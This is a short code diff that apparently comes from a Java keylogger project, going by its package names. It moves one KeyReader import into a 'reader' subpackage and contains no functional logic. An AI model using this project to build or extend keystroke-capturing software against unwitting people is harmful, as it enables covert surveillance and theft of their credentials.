@@ -1,6 +1,6 @@
 package com.mossad.keylogger.timer;
 
-import com.mossad.keylogger.KeyReader;
+import com.mossad.keylogger.reader.KeyReader;
 import com.mossad.keylogger.logging.LogRecorder;
 
 import java.util.List;
